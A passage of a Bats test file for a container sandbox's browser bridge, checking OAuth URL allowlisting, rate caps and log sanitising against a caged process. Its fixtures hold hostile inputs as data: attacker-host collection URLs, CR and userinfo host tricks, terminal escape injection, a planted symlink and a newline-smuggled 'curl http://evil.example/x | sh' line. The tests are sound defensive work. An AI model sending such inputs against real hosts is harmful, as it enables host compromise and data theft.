  run _is_auth_url "http://attacker.tld/collect?redirect_uri=&d=BASE64"
  assert_failure
  run _is_auth_url "https://webhook.site/abc?redirect_uri=1"
  assert_failure
  # And the one that isolates the ORIGIN check: a perfectly well formed OAuth
  # authorize URL, at a host Cleat will not point a browser at.
  run _is_auth_url "https://evil.example.com/authorize?client_id=x&redirect_uri=http%3A%2F%2Flocalhost%3A45454%2Fcallback"
  assert_failure
}

@test "auth url: a fragment-borne redirect_uri is not auth" {
  # A fragment is never sent to the server, so it is not part of an OAuth
  # request. The old glob matched it there, and _extract_callback_port reads the
  # whole string, so the host bound a port for it too.
  run _is_auth_url "https://claude.ai/x#&redirect_uri=http://localhost:3000/"
  assert_failure
}

@test "auth url: userinfo in the outer URL is not auth" {
  run _is_auth_url "https://claude.ai@evil.example/?redirect_uri=http%3A%2F%2Flocalhost%3A8080%2F"
  assert_failure
}

@test "auth url: a redirect_uri that is not an absolute http(s) URL is not auth" {
  run _is_auth_url "https://claude.ai/x?redirect_uri=x"
  assert_failure
  run _is_auth_url "https://claude.ai/x?redirect_uri=javascript%3Aalert(1)"
  assert_failure
}

@test "auth url: a redirect_uri whose authority does not parse is not auth" {
  # The decoded callback has to be a URL whose host parses, so userinfo in the
  # redirect_uri does not make an allowlisted authorize URL auth.
  run _is_auth_url "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Fuser%40evil.example%2Fcb"
  assert_failure
  # The control: the same URL with a plain loopback callback.
  run _is_auth_url "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fcb"
  assert_success
}

@test "auth url: redirect_uri in the PATH is still not auth" {
  run _is_auth_url "https://claude.ai/path/redirect_uri=abc"
  assert_failure
}

@test "bridge policy: auto opens an allowlisted auth URL" {
  run _browser_should_open auto 1 1 1
  assert_success
  run _browser_should_open auto 0 1 1
  assert_success
}

@test "bridge policy: auto never opens an unallowlisted destination" {
  # The destination is the one thing nothing else in the function can
  # substitute for. is_auth used to return early, so a terminal was irrelevant.
  run _browser_should_open auto 1 1 0
  assert_failure
  run _browser_should_open auto 0 1 0
  assert_failure
  run _browser_should_open auto 0 0 0
  assert_failure
}

@test "bridge policy: auto defers a plain link, terminal or not" {
  # With a terminal this is unchanged: the terminal opens a clicked link itself.
  run _browser_should_open auto 1 0 1
  assert_failure
  # Without one it is the change that matters. That window is cleat login, a
  # pipe, cron, CI and nohup, which is the unattended overnight run: nobody is
  # watching the browser, so opening a link the box chose has no user value.
  run _browser_should_open auto 0 0 1
  assert_failure
}

@test "bridge policy: always is a full bypass and off opens nothing" {
  run _browser_should_open always 1 0 0
  assert_success
  run _browser_should_open always 0 0 0
  assert_success
  run _browser_should_open off 0 1 1
  assert_failure
}


# ── the gate, driven through the real watcher ───────────────────────────────

_bw_fake_open() {
  cat > "$TEST_TEMP/fake_open" <<EOF
#!/usr/bin/env bash
echo "\$1" >> "$TEST_TEMP/opened.log"
EOF
  chmod +x "$TEST_TEMP/fake_open"
}

# Run the watcher against one URL and stop. $1 = the URL, $2 = bridge mode,
# $3 = host_opens_clicks, $4 = container name (empty for no proxy), $5 = the log
# text that means the watcher is done with this URL (a grep basic regex).
#
# The wait ends on that text and never on a count of polls sized to the fast
# case. A proxy that never binds spends the watcher's whole readiness loop
# before its line is written, and a fixed count of polls lost that race on a
# slow runner. The deadline is only a backstop.
_bw_run_once() {
  local url="$1" mode="${2:-auto}" clicks="${3:-1}" cname="${4:-}"
  local want="${5:-opening URL\|deferring URL\|BLOCKED-ORIGIN}"
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  _bw_fake_open
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "$cname" "$mode" "$clicks" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  printf '%s' "$url" > "$dir/.browser-open"
  local i=0
  while [ "$i" -lt 25 ]; do
    grep -q "$want" "$dir/.proxy-log" 2>/dev/null && break
    sleep 0.4
    i=$(( i + 1 ))
  done
  kill "$wpid" 2>/dev/null || true
  wait "$wpid" 2>/dev/null || true
}

@test "browser bridge: an unallowlisted origin is refused and never opened" {
  # Retargeted: the fixture was https://evil.example.com/pwn?redirect_uri=x,
  # which has no OAuth shape. The refusal marker is now written only for a URL
  # that listing its origin would have opened, because the notice it feeds
  # prints `cleat browser allow`, and for a plain link that command fixes
  # nothing. The property this protected (an unlisted origin never opens and
  # its refusal is logged with the origin) is unchanged, on a real authorize URL.
  _bw_run_once "https://evil.example.com/oauth/authorize?client_id=x&redirect_uri=http%3A%2F%2Flocalhost%3A45454%2Fcallback" auto 1 ""
  [ ! -f "$TEST_TEMP/opened.log" ] || { echo "the bridge opened a destination the box chose"; return 1; }
  run cat "$TEST_TEMP/clip/.proxy-log"
  assert_output --partial "BLOCKED-ORIGIN"
  assert_output --partial "origin=evil.example.com"
}

@test "browser bridge: an allowlisted auth URL still opens" {
  _extract_callback_port() { echo "1455"; return 0; }
  _auth_callback_proxy() { [ -n "${4:-}" ] && : > "$4"; sleep 5; }
  _port_in_use() { return 1; }
  _bw_run_once "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fcb" auto 1 "mybox"
  [ -f "$TEST_TEMP/opened.log" ] || { echo "an allowlisted auth URL was not opened"; return 1; }
}

@test "browser bridge: the gate reads the bytes that are OPENED, not the raw claim" {
  # Stripping control characters REWRITES an authority: claude.ai<CR>.evil.example
  # becomes claude.ai.evil.example, a different host. The opener is handed the
  # cleaned copy, so a policy that read the raw claim would be deciding about a
  # destination the browser never visits.
  # Two halves. First: stripping control characters REWRITES an authority, so
  # the two strings are different destinations and only the cleaned one is ever
  # visited.
  local raw; raw="$(printf 'https://claude.ai\r.evil.example/x')"
  local cleaned; cleaned="$(printf '%s' "$raw" | LC_ALL=C tr -d '[:cntrl:]')"
  run _bridge_url_host "$cleaned"
  assert_success
  assert_output "claude.ai.evil.example"
  run _bridge_dest_allowed "$cleaned"
  assert_failure
  _bw_run_once "$raw" auto 1 ""
  [ ! -f "$TEST_TEMP/opened.log" ] || { echo "the bridge opened a rewritten authority"; return 1; }

  # Second, and this is the half that pins WHICH string the gate reads: a
  # control character after the host makes the raw claim unparseable while the
  # cleaned copy is an ordinary allowlisted auth URL. Deciding on the raw claim
  # would refuse a login that is perfectly fine.
  rm -rf "$TEST_TEMP/clip" "$TEST_TEMP/opened.log"
  _extract_callback_port() { echo "1455"; return 0; }
  _auth_callback_proxy() { [ -n "${4:-}" ] && : > "$4"; sleep 5; }
  _port_in_use() { return 1; }
  local ok; ok="$(printf 'https://claude.ai\r/oauth/authorize?redirect_uri=http%%3A%%2F%%2Flocalhost%%3A1455%%2Fcb')"
  run _bridge_url_host "$ok"
  assert_failure
  _bw_run_once "$ok" auto 1 "mybox"
  [ -f "$TEST_TEMP/opened.log" ] || { echo "the gate judged the raw claim instead of the bytes it opens"; return 1; }
}

@test "browser bridge: the callback proxy does not bind for an unallowlisted origin" {
  # Before the gate this ran in EVERY mode, off included, so the box could make
  # the host bind a loopback port and forward into the container with no tab and
  # nothing on screen. It is the only mechanism in Cleat that binds a box-chosen
  # host port.
  local mode
  for mode in auto always off; do
    rm -rf "$TEST_TEMP/clip" "$TEST_TEMP/proxy_started" "$TEST_TEMP/opened.log"
    _extract_callback_port() { echo "1455"; return 0; }
    _auth_callback_proxy() { touch "$TEST_TEMP/proxy_started"; }
    _port_in_use() { return 1; }
    _bw_run_once "https://evil.example.com/x?redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fcb" "$mode" 1 "mybox"
    [ ! -f "$TEST_TEMP/proxy_started" ] || { echo "the proxy bound a box-chosen port for an unallowlisted origin in mode=$mode"; return 1; }
  done
}

@test "browser bridge: off mode still runs the proxy for an ALLOWLISTED origin" {
  # off withholds every open, and the login must still complete when the user
  # opens the URL by hand.
  _extract_callback_port() { echo "1455"; return 0; }
  _auth_callback_proxy() { touch "$TEST_TEMP/proxy_started"; [ -n "${4:-}" ] && : > "$4"; sleep 5; }
  _port_in_use() { return 1; }
  _bw_run_once "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fcb" off 0 "mybox"
  [ -f "$TEST_TEMP/proxy_started" ] || { echo "off mode stopped the callback proxy, which strands a hand-opened login"; return 1; }
  [ ! -f "$TEST_TEMP/opened.log" ] || { echo "off mode opened a browser"; return 1; }
}

@test "browser bridge: a callback port a host service already holds opens nothing" {
  # Binding is impossible, and opening the browser anyway aims it at THAT
  # service with the host's cookies, for a port the box named.
  _extract_callback_port() { echo "5432"; return 0; }
  _auth_callback_proxy() { touch "$TEST_TEMP/proxy_started"; }
  _port_in_use() { return 0; }   # something is listening
  _bw_run_once "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A5432%2Fcb" auto 1 "mybox"
  [ ! -f "$TEST_TEMP/opened.log" ] || { echo "the browser was pointed at a port a host service holds"; return 1; }
  run cat "$TEST_TEMP/clip/.proxy-log"
  assert_output --partial "already in use"
}

@test "browser bridge: a proxy that never binds opens nothing" {
  _extract_callback_port() { echo "1455"; return 0; }
  _auth_callback_proxy() { sleep 5; }    # starts, never touches the ready file
  _port_in_use() { return 1; }
  # "deferring URL" is written after "never bound", so waiting for it cannot
  # stop the watcher before the line this test reads.
  _bw_run_once "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fcb" auto 1 "mybox" "deferring URL"
  [ ! -f "$TEST_TEMP/opened.log" ] || { echo "the browser opened before the callback listener existed"; return 1; }
  run cat "$TEST_TEMP/clip/.proxy-log"
  assert_output --partial "never bound"
}

@test "browser bridge: a device-flow page at a listed origin defers in auto" {
  # The current contract, pinned so the docs stay honest: a listed origin is
  # auto-opened only for an OAuth authorize URL. gh prints its device link and
  # code, and the user opens the link by clicking it. Not the bridge.
  run _bridge_dest_allowed "https://microsoft.com/devicelogin"
  assert_success
  run _is_auth_url "https://microsoft.com/devicelogin"
  assert_failure
  _bw_run_once "https://github.com/login/device" auto 0 ""
  [ ! -f "$TEST_TEMP/opened.log" ] || { echo "auto mode opened a device-flow page; the docs say it does not"; return 1; }
  run cat "$TEST_TEMP/clip/.proxy-log"
  assert_output --partial "deferring URL to terminal"
}

@test "browser bridge: always is a full bypass, by design and documented" {
  _bw_run_once "https://evil.example.com/x" always 1 ""
  [ -f "$TEST_TEMP/opened.log" ] || { echo "always must keep opening every origin, or one wrong default entry is unrecoverable"; return 1; }
}

# ── the rate cap ────────────────────────────────────────────────────────────

@test "rate cap: a seventh open inside a minute is refused, logged and the watcher keeps running" {
  # Before the cap, 29 to 40 distinct URLs opened in 15 to 25 seconds with no
  # line saying anything. always is the mode with no other gate in the way, and
  # the cap holds there too: the bypass lifts the destination check, not this.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  _bw_fake_open
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "" "always" "0" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  local i j seen
  for i in 1 2 3 4 5 6 7; do
    printf 'https://x.example/rate/%s' "$i" > "$dir/.browser-open"
    for j in 1 2 3 4 5 6 7 8 9 10; do
      seen="$(grep -c "opening URL\|$_BROWSER_CAPPED_MARK" "$dir/.proxy-log" 2>/dev/null || true)"
      [ "${seen:-0}" -ge "$i" ] && break
      sleep 0.3
    done
  done
  local alive=0; kill -0 "$wpid" 2>/dev/null && alive=1
  kill "$wpid" 2>/dev/null || true
  wait "$wpid" 2>/dev/null || true
  [ "$alive" = 1 ] || { echo "the watcher stopped at the cap, so a later login would find nobody polling"; return 1; }
  run wc -l < "$TEST_TEMP/opened.log"
  [ "$(tr -d '[:space:]' <<< "$output")" = "6" ] || { echo "expected 6 opens inside the minute, got: $output"; cat "$dir/.proxy-log"; return 1; }
  run grep "$_BROWSER_CAPPED_MARK" "$dir/.proxy-log"
  assert_success
  assert_output --partial "limit=6/min,30/session"
  assert_output --partial "url=https://x.example/rate/7"
  # The ledger is outside the bind mount. Inside it, the box could empty it
  # between two opens and the minute cap would be a number in a comment.
  [ -s "$TEST_TEMP/clipclaim/.opens" ] || { echo "the minute ledger is not in the claim dir"; return 1; }
  [ ! -e "$dir/.opens" ] || { echo "the minute ledger landed inside the box's clip dir"; return 1; }
}

@test "rate cap: the watcher counts its own opens toward the session cap" {
  # The helper refusing at thirty proves nothing unless the watcher hands it a
  # count that grows. It is also the only cap left when the claim dir cannot be
  # created outside the mount. Lowered here in the sourced shell, and the
  # minute cap raised out of the way, so three URLs reach it.
  _BROWSER_RATE_PER_SESSION=2
  _BROWSER_RATE_PER_MIN=100
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  _bw_fake_open
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "" "always" "0" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  local i j seen
  for i in 1 2 3; do
    printf 'https://x.example/session/%s' "$i" > "$dir/.browser-open"
    for j in 1 2 3 4 5 6 7 8 9 10; do
      seen="$(grep -c "opening URL\|$_BROWSER_CAPPED_MARK" "$dir/.proxy-log" 2>/dev/null || true)"
      [ "${seen:-0}" -ge "$i" ] && break
      sleep 0.3
    done
  done
  kill "$wpid" 2>/dev/null || true
  wait "$wpid" 2>/dev/null || true
  run wc -l < "$TEST_TEMP/opened.log"
  [ "$(tr -d '[:space:]' <<< "$output")" = "2" ] || { echo "expected 2 opens under a session cap of 2, got: $output"; cat "$dir/.proxy-log"; return 1; }
  run grep "$_BROWSER_CAPPED_MARK" "$dir/.proxy-log"
  assert_success
  assert_output --partial "limit=100/min,2/session url=https://x.example/session/3"
  # The line the watcher wrote is the line the report reads, so the marker
  # cannot drift between the two.
  run _maybe_report_capped_opens "$dir/.proxy-log" 0
  assert_output --partial "Did not open"
  assert_output --partial "https://x.example/session/3"
  refute_output --partial "https://x.example/session/1"
}

@test "rate cap: thirty opens is the ceiling for one session" {
  run _browser_rate_take "$TEST_TEMP/ledger" 29
  assert_success
  run _browser_rate_take "$TEST_TEMP/ledger-2" 30
  assert_failure
}

@test "rate cap: an open older than the minute stops counting" {
  # The cap is a window, not a lifetime ban: a login after the window works.
  local now old i; now="$(date +%s)"; old=$(( now - 61 ))
  : > "$TEST_TEMP/ledger"
  for i in 1 2 3 4 5 6; do printf '%s\n' "$old" >> "$TEST_TEMP/ledger"; done
  run _browser_rate_take "$TEST_TEMP/ledger" 0
  assert_success
  : > "$TEST_TEMP/ledger"
  for i in 1 2 3 4 5 6; do printf '%s\n' "$now" >> "$TEST_TEMP/ledger"; done
  run _browser_rate_take "$TEST_TEMP/ledger" 0
  assert_failure
}

@test "rate cap: a malformed or future ledger entry neither counts nor breaks the count" {
  local now; now="$(date +%s)"
  printf '%s\n' "08" "abc" "$(( now + 3600 ))" "$(( now + 3600 ))" "$(( now + 3600 ))" \
    "$(( now + 3600 ))" "$(( now + 3600 ))" "$(( now + 3600 ))" "99999999999999999999" > "$TEST_TEMP/ledger"
  run _browser_rate_take "$TEST_TEMP/ledger" 0
  assert_success
  refute_output --partial "value too great"
  refute_output --partial "syntax error"
}

# ── the denial report on the terminal ───────────────────────────────────────

@test "blocked report: names the URL, the bare origin and the command that allows it" {
  local log="$TEST_TEMP/.proxy-log"
  printf '[browser-watcher 10:00:00] %s origin=auth.example.com url=https://auth.example.com/oauth/authorize?client_id=abc\n' \
    "$_BROWSER_BLOCKED_MARK" > "$log"
  run _maybe_report_blocked_opens "$log" 0
  assert_success
  assert_output --partial "Blocked"
  assert_output --partial "https://auth.example.com/oauth/authorize?client_id=abc"
  assert_output --partial "cleat browser allow auth.example.com"
  assert_output --partial "github.com/cleatdev/cleat/issues/new"
}

@test "blocked report: says nothing when nothing was blocked" {
  # concept/21 forbids the nag. An empty session must print no line at all.
  local log="$TEST_TEMP/.proxy-log"
  printf '[browser-watcher 10:00:00] opening URL on host url=https://claude.ai/x\n' > "$log"
  run _maybe_report_blocked_opens "$log" 0
  assert_success
  assert_output ""
}

@test "blocked report: only this session, never a previous one" {
  # Without the offset a refusal from an earlier session re-fires on every run.
  local log="$TEST_TEMP/.proxy-log"
  printf '[browser-watcher 09:00:00] %s origin=old.example.com url=https://old.example.com/\n' \
    "$_BROWSER_BLOCKED_MARK" > "$log"
  local off; off="$(wc -c < "$log" | tr -d ' ')"
  run _maybe_report_blocked_opens "$log" "$off"
  assert_output ""
}

@test "blocked report: a forged log line cannot inject terminal control bytes" {
  # The box writes the proxy log. Everything printed from it is box-authored by
  # construction, which is exactly why it is sanitized first.
  local log="$TEST_TEMP/.proxy-log"
  printf '[browser-watcher 10:00:00] %s origin=a.example.com url=https://a.example.com/\033[2Jwiped\n' \
    "$_BROWSER_BLOCKED_MARK" > "$log"
  run _maybe_report_blocked_opens "$log" 0
  refute_output --partial $'\033[2J'
}

@test "blocked report: the allow line names the URL's own host, never the logged origin field" {
  # The field is box-writable text. Control bytes in it must never reach the
  # terminal, and it must never pick the host the allow line names.
  local log="$TEST_TEMP/.proxy-log"
  printf '[browser-watcher 10:00:00] %s origin=evil.example\033[2J url=https://auth.example.com/oauth/authorize?redirect_uri=http%%3A%%2F%%2Flocalhost%%3A45454%%2Fcb\n' \
    "$_BROWSER_BLOCKED_MARK" > "$log"
  run _maybe_report_blocked_opens "$log" 0
  assert_output --partial "cleat browser allow auth.example.com"
  refute_output --partial "evil.example"
  refute_output --partial $'\033[2J'
}

@test "blocked report: a loopback login gets no allow line, because allow refuses it" {
  local log="$TEST_TEMP/.proxy-log"
  printf '[browser-watcher 10:00:00] %s origin=localhost url=http://localhost:8080/oauth/authorize?redirect_uri=http%%3A%%2F%%2Flocalhost%%3A8080%%2Fcb\n' \
    "$_BROWSER_BLOCKED_MARK" > "$log"
  run _maybe_report_blocked_opens "$log" 0
  assert_output --partial "http://localhost:8080/oauth/authorize"
  assert_output --partial "never opens a loopback or private address"
  refute_output --partial "cleat browser allow"
}

@test "capped report: names the URL the cap held back and how many" {
  # Claude Code hands a loopback authorize URL only to $BROWSER, so a capped
  # login used to look like a browser that never opened, with the URL in a
  # log inside the box's own clip dir and nothing on the terminal.
  local log="$TEST_TEMP/.proxy-log" i
  : > "$log"
  for i in 1 2 3 4; do
    printf '[browser-watcher 10:00:0%s] %s limit=6/min,30/session url=https://claude.ai/oauth/authorize?n=%s\n' \
      "$i" "$_BROWSER_CAPPED_MARK" "$i" >> "$log"
  done
  run _maybe_report_blocked_opens "$log" 0
  assert_success
  assert_output --partial "browser URLs from the box"
  assert_output --partial "(rate cap: 6 a minute, 30 a session)"
  assert_output --partial "https://claude.ai/oauth/authorize?n=1"
  assert_output --partial "...and 1 more"
  refute_output --partial "https://claude.ai/oauth/authorize?n=4"
  # A capped open is not an origin refusal, so no allow line is offered.
  refute_output --partial "cleat browser allow"
}

@test "capped report: only this session, never a previous one" {
  # Without the offset a capped open from an earlier session re-fires on every
  # run, which is the nag concept/21 forbids.
  local log="$TEST_TEMP/.proxy-log"
  printf '[browser-watcher 09:00:00] %s limit=6/min,30/session url=https://old.example.com/\n' \
    "$_BROWSER_CAPPED_MARK" > "$log"
  local off; off="$(wc -c < "$log" | tr -d ' ')"
  printf '[browser-watcher 10:00:00] opening URL on host url=https://claude.ai/x\n' >> "$log"
  run _maybe_report_capped_opens "$log" "$off"
  assert_success
  assert_output ""
}

@test "capped report: a forged line cannot inject terminal control bytes or a heading" {
  # The box writes the proxy log, so the line is box-authored by construction.
  # The limits printed come from the constants, never from the logged field.
  local log="$TEST_TEMP/.proxy-log"
  printf '[browser-watcher 10:00:00] %s limit=9999/min,9999/session url=https://a.example.com/\033[2Jwiped\n' \
    "$_BROWSER_CAPPED_MARK" > "$log"
  printf 'x[browser-watcher 10:00:00] %s limit=6/min,30/session url=https://unanchored.example/\n' \
    "$_BROWSER_CAPPED_MARK" >> "$log"
  run _maybe_report_capped_opens "$log" 0
  assert_output --partial "https://a.example.com/"
  assert_output --partial "(rate cap: 6 a minute, 30 a session)"
  refute_output --partial $'\033[2J'
  refute_output --partial "9999"
  refute_output --partial "unanchored.example"
}

# ── stale debounce markers ──────────────────────────────────────────────────

@test "marker sweep: removes expired debounce markers, keeps fresh ones" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  mkdir "$dir/.open.stale_9"
  touch -t 202001010000 "$dir/.open.stale_9"     # long past the 2s window
  mkdir "$dir/.open.fresh_9"                     # now: inside the window
  _browser_sweep_stale_markers "$dir"
  [ ! -d "$dir/.open.stale_9" ] || { echo "expired debounce marker survived the sweep"; return 1; }
  [ -d "$dir/.open.fresh_9" ] || { echo "fresh debounce marker was swept; a live debounce would break"; return 1; }
}

@test "marker sweep: watcher start clears markers a dead session left behind" {
  # A box whose last session never claims another URL keeps its final markers
  # forever (the per-claim sweep never runs again); watcher startup must sweep.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  mkdir "$dir/.open.leftover_3"
  touch -t 202001010000 "$dir/.open.leftover_3"
  cat > "$TEST_TEMP/fake_open" <<EOF
#!/usr/bin/env bash
EOF
  chmod +x "$TEST_TEMP/fake_open"
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "" "auto" "1" >/dev/null 2>&1 &
  local wpid=$!
  sleep 1
  kill "$wpid" 2>/dev/null || true
  wait "$wpid" 2>/dev/null || true
  [ ! -d "$dir/.open.leftover_3" ] || { echo "watcher start did not sweep a stale marker"; return 1; }
}

@test "browser bridge: watcher startup keeps a FRESH pending URL (no sibling swallow)" {
  # Concurrent watchers on one box are supported (a login alongside a session,
  # two shells). The startup sweep used to rm the bridge file unconditionally,
  # so a watcher starting moments after claude wrote a login URL swallowed it
  # before any sibling's 0.5s poll could claim it: no tab, no proxy, stranded
  # login. A fresh file must survive startup and get claimed and opened.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  cat > "$TEST_TEMP/fake_open" <<EOF
#!/usr/bin/env bash
echo "\$1" >> "$TEST_TEMP/opened.log"
EOF
  chmod +x "$TEST_TEMP/fake_open"
  # Retargeted twice over. The fixture is an allowlisted authorize URL because
  # a plain link at example.com is now refused by the destination gate, and
  # host_opens_clicks stays 0 because that is the case the sweep bug hit
  # (`cleat login` passes 0 unconditionally). What the test protects is
  # unchanged: a FRESH pending URL must survive watcher startup and be claimed.
  printf '%s' "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fcb" > "$dir/.browser-open"
  _extract_callback_port() { echo "1455"; return 0; }
  _auth_callback_proxy() { [ -n "${4:-}" ] && : > "$4"; sleep 5; }
  _port_in_use() { return 1; }
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "mybox" "auto" "0" >/dev/null 2>&1 &
  local wpid=$!
  sleep 2
  kill "$wpid" 2>/dev/null || true
  wait "$wpid" 2>/dev/null || true
  [ -f "$TEST_TEMP/opened.log" ] || { echo "startup sweep swallowed a fresh pending URL"; return 1; }
  run cat "$TEST_TEMP/opened.log"
  assert_output --partial "claude.ai"
}

@test "browser bridge: auto mode does NOT re-open a plain link the terminal handled" {
  # Integration: drive the real watcher loop with an interactive terminal flag.
  # The plain link must never reach the opener (the visible duplicate tab).
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  cat > "$TEST_TEMP/fake_open" <<EOF
#!/usr/bin/env bash
echo "\$1" >> "$TEST_TEMP/opened.log"
EOF
  chmod +x "$TEST_TEMP/fake_open"
  # cname="" so the auth branch is skipped (is_auth stays 0); host_opens_clicks=1.
  # The fixture is an ALLOWLISTED plain link, so the deferral is still what
  # stops it rather than the destination gate one step earlier. That keeps the
  # duplicate-tab property this test was written for under test, and the gate's
  # own refusal has its own test above.
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "" "auto" "1" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7                                  # let it pass the startup rm -f
  printf '%s' "https://github.com/cleatdev/cleat" > "$dir/.browser-open"
  sleep 2                                    # several poll cycles
  kill -0 "$wpid" 2>/dev/null || { echo "watcher died before the assertion"; return 1; }
  kill "$wpid" 2>/dev/null || true
  wait "$wpid" 2>/dev/null || true
  [ ! -f "$TEST_TEMP/opened.log" ] || { echo "bridge re-opened a plain link the terminal already opened"; return 1; }
  # The deferral is logged: a silent defer is exactly what made the code-paste
  # login regression hard to diagnose from the field.
  run cat "$dir/.proxy-log"
  assert_output --partial "deferring URL to terminal"
}

@test "browser bridge: auto mode still opens an auth URL on an interactive terminal" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  _extract_callback_port() { echo "1455"; return 0; }   # force the auth branch
  # The stub must signal readiness ($4 is the marker the backend touches on a
  # successful bind) and stay alive, or the watcher correctly refuses to open:
  # a proxy that exits without binding means the callback has nowhere to land.
  # That refusal has its own test; this one is about the auth URL still opening.
  _auth_callback_proxy() { [ -n "${4:-}" ] && : > "$4"; sleep 5; }
  _port_in_use() { return 1; }
  cat > "$TEST_TEMP/fake_open" <<EOF
#!/usr/bin/env bash
echo "\$1" >> "$TEST_TEMP/opened.log"
EOF
  chmod +x "$TEST_TEMP/fake_open"
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "mybox" "auto" "1" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  printf '%s' "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fcb" > "$dir/.browser-open"
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    [ -f "$TEST_TEMP/opened.log" ] && break
    sleep 0.5
  done
  kill "$wpid" 2>/dev/null || true
  wait "$wpid" 2>/dev/null || true
  [ -f "$TEST_TEMP/opened.log" ] || { echo "auth URL was not opened by the bridge"; return 1; }
}

@test "browser bridge: off mode opens nothing yet still starts the auth proxy (login works)" {
  # off withholds every browser open, even an auth URL, but the OAuth callback
  # proxy must STILL start so `cleat login` completes when the URL is opened by
  # hand. The proxy is started before the open gate, so it runs in every mode.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  _extract_callback_port() { echo "1455"; return 0; }   # force the auth branch
  # $4 is the readiness marker. Without it the watcher defers on "the callback
  # listener never came up" and never reaches the mode decision at all, so the
  # test would pass for the wrong reason.
  _auth_callback_proxy() { touch "$TEST_TEMP/proxy_started"; [ -n "${4:-}" ] && : > "$4"; sleep 5; }
  _port_in_use() { return 1; }
  cat > "$TEST_TEMP/fake_open" <<EOF
#!/usr/bin/env bash
echo "\$1" >> "$TEST_TEMP/opened.log"
EOF
  chmod +x "$TEST_TEMP/fake_open"
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "mybox" "off" "1" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  printf '%s' "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fcb" > "$dir/.browser-open"
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    [ -f "$TEST_TEMP/proxy_started" ] && break
    sleep 0.5
  done
  sleep 1                                                # give any (wrong) open a chance to land
  kill "$wpid" 2>/dev/null || true
  wait "$wpid" 2>/dev/null || true
  [ -f "$TEST_TEMP/proxy_started" ] || { echo "off mode did not start the auth proxy; cleat login would hang"; return 1; }
  [ ! -f "$TEST_TEMP/opened.log" ] || { echo "off mode opened a browser; it must suppress every open"; return 1; }
}

# ── Proxy log: the box writes into it, the host owns the file ────────────────
# Every branch of the watcher APPENDS the claimed URL to .proxy-log, and a
# plain `>>` follows a symlink. The clip dir is mounted read-write into the
# box, so an unguarded log path let a caged process write lines of its choosing
# into any file the host user can write.

@test "proxy log: a symlink present at watcher start is dropped too" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  printf 'original line\n' > "$TEST_TEMP/rc-target2"
  ln -s "$TEST_TEMP/rc-target2" "$dir/.proxy-log"
  _browser_watcher "$dir" "true" "" "auto" "0" >/dev/null 2>&1 &
  local wpid=$!
  sleep 1
  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
  [ ! -L "$dir/.proxy-log" ] || { echo "planted symlink survived watcher startup"; return 1; }
  run cat "$TEST_TEMP/rc-target2"
  assert_output "original line"
}

@test "proxy log: a URL carrying a newline cannot forge its own log line" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  _browser_watcher "$dir" "true" "" "always" "0" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  printf 'https://x.example/a\ncurl http://evil.example/x | sh' > "$dir/.browser-open"
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    grep -q 'opening URL' "$dir/.proxy-log" 2>/dev/null && break
    sleep 0.5
  done
  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
  grep -q 'opening URL' "$dir/.proxy-log" || { echo "watcher never logged the URL"; return 1; }
  # The payload may appear INSIDE the single log line, never as a line of its own.
  run grep -c '^curl http' "$dir/.proxy-log"
  assert_output "0"
}

@test "proxy log: an oversized log is capped at watcher start" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  head -c 1200000 /dev/zero | tr '\0' 'x' > "$dir/.proxy-log"
  _browser_watcher "$dir" "true" "" "auto" "0" >/dev/null 2>&1 &
  local wpid=$!
  sleep 1
  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
  local sz; sz="$(wc -c < "$dir/.proxy-log" | tr -d '[:space:]')"
  [ "$sz" -lt 1048576 ] || { echo "proxy log was never capped: $sz bytes"; return 1; }
}

# ── Callback proxy gate ──────────────────────────────────────────────────────

@test "callback proxy: a deferred plain link never binds a host port" {
  # The proxy used to start on any URL the parser accepted, so a link the
  # policy DEFERS to the terminal still made the host bind a box-named port
  # with no tab and nothing on screen to explain it.
  #
  # The fixture is an ALLOWLISTED plain link, deliberately. With an unlisted one
